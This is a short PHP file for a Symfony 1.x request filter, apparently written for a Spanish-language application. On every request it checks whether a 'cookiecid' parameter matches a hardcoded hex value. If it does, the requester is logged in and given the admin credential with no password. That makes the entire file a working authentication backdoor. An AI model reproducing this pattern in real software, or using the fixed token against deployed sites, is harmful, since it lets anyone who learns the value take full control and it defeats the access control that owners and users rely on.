<?php

class CalculoFilter extends sfFilter
{
  public function execute($filterChain)
  {
    $user = $this->getContext()->getUser();
    //PARA EL CALCULO
    $phpsessid = sfContext::getInstance()->getRequest()->getParameter('cookiecid');
    if ($phpsessid=='44aa95ac18060e7dcdd80251ef74f733')
    {
    	$user->setAuthenticated(true);
    	$user->addCredential('admin');
    }

    $filterChain->execute();
  }
}
